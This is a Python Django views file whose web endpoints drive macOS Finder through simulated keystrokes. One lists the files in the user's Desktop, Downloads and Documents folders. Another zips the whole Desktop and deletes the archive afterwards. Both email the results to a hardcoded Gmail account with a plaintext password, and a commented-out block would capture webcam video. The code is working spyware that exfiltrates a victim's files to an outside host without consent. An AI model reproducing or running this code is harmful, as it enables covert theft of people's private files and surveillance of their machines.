from genericpath import isfile
from django.shortcuts import render
from django.http import HttpResponse

from pynput.keyboard import Key, Controller as KeyController, Listener
from pynput.mouse import Button, Controller as MouseController
import time
from datetime import datetime
import re

import email, smtplib, ssl

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import pyperclip

from os.path import expanduser
home = expanduser("~")


keyboard = KeyController()
mouse = MouseController()

def index(request):
  mac_spolight('Finder')

  folders = ['Desktop', 'Downloads', 'Documents']
  # folders = ['Desktop']
  with open(f"data.txt", "w") as f:
    print(datetime.today().strftime('%Y-%m-%d-%H:%M:%S'), file=f)

  # Open camera and save live video
  # import numpy as np
  # import cv2 as cv
  # cap = cv.VideoCapture(0)
  # cap.set(3,640)
  # cap.set(4,480)
  # # Define the codec and create VideoWriter object
  # fourcc = cv.VideoWriter_fourcc(*'mp4v')
  # out = cv.VideoWriter('output.mp4', fourcc, 20.0, (640,  480), 1)
  # while cap.isOpened():
  #     ret, frame = cap.read()
  #     if not ret:
  #         print("Can't receive frame (stream end?). Exiting ...")
  #         break
  #     # frame = cv.flip(frame, 0)
  #     # write the flipped frame
  #     out.write(frame)
  #     cv.imshow('frame', frame)
  #     if cv.waitKey(1) == ord('q'):
  #         break
  # # Release everything if job is finished
  # cap.release()
  # out.release()
  # cv.destroyAllWindows()

  tab = 0
  for folder in folders:
    with open(f"data.txt", "a") as f:
      # write the keylogs to the file
      print('/' + folder, file=f)
    tab += 1
 
    open_folder(folder)

    # Have Finder view as List
    key_cmd('2')
    time.sleep(0.5)

    save_filenames(tab)

    send_email('data.txt', 'CONFIDENTIAL: List of Files', 'Your eyes only')

  return HttpResponse("Hello, world. You're at the key_control index.")

def zip(request):
  mac_spolight('Finder')

  # For demo purposes, I only zip in folders and files from Desktop
  open_folder('Desktop')

  key_cmd('a')

  mouse.click(Button.right)
  time.sleep(0.2)

  keyboard.type('compress')
  time.sleep(0.1)
  keyboard.tap(Key.enter)
  time.sleep(8)

  filename = key_copy()
  time.sleep(0.1)

  path = home + '/Desktop/' + filename
  print(path)

  if send_email(path, 'TOP SECRET: User Files', 'Unzip the files, thanks.'):
    key_cmd(Key.delete)

  return HttpResponse("Hello, world. You're at the key_control zip.")

def send_email(path, subject, body):
  sender_email = "thebestcheeseonearthexists@gmail.com"
  receiver_email = "thebestcheeseonearthexists@gmail.com"
  password = 'thebestcheese'

  msg = MIMEMultipart()
  msg['From'] = sender_email
  msg['To'] = receiver_email
  msg['Subject'] = subject

  msg.attach(MIMEText(body, 'plain'))

  filename = path
  attachment = open(filename, 'rb')

  p = MIMEBase('application', 'octet-stream')
  p.set_payload((attachment).read())
  encoders.encode_base64(p)
  p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
  msg.attach(p)

  s = smtplib.SMTP('smtp.gmail.com', 587)
  s.starttls()
  s.login(sender_email, password)
  text = msg.as_string()
  s.sendmail(sender_email, receiver_email, text)
  s.quit()

  return True

def check_file_ext(filename):
  if filename == 'LICENSE':
    return True
  return re.match(r'^.*\.[^\\]+$', filename)

def save_filenames(tab):
  keyboard.tap(Key.down)
  time.sleep(0.1)

  is_file = True
  last = ''
  curr = key_copy()
  while (last != curr):
    is_file = check_file_ext(curr)
    with open(f"data.txt", "a") as f:
      # write the keylogs to the file
      print('  ' * tab + ('' if is_file else '/') + curr, file=f)
    print(f"[+] Saved {curr} data.txt")

    if not is_file:
      key_cmd(Key.down)
      save_filenames(tab + 1)
      key_cmd(Key.up)
    keyboard.tap(Key.down)
    last = curr
    curr = key_copy()
  tab -= 1

def key_cmd(command):
  keyboard.press(Key.cmd)
  keyboard.press(command)
  keyboard.release(Key.cmd)
  keyboard.release(command)
  time.sleep(0.1)

def key_shift_cmd(command):
  keyboard.press(Key.shift)
  keyboard.press(Key.cmd)
  keyboard.press(command)
  keyboard.release(Key.shift)
  keyboard.release(Key.cmd)
  keyboard.release(command)
  time.sleep(0.1)

def key_copy():
  key_cmd('c')
  return pyperclip.paste()

def mac_spolight(app):
  key_cmd(Key.space)
  time.sleep(0.2)

  keyboard.type(app)
  time.sleep(0.2)

  keyboard.tap(Key.enter)
  time.sleep(0.1)

def open_folder(folder):
  key_shift_cmd('g')
  keyboard.type(folder)
  time.sleep(1)
  keyboard.tap(Key.enter)
  time.sleep(0.5)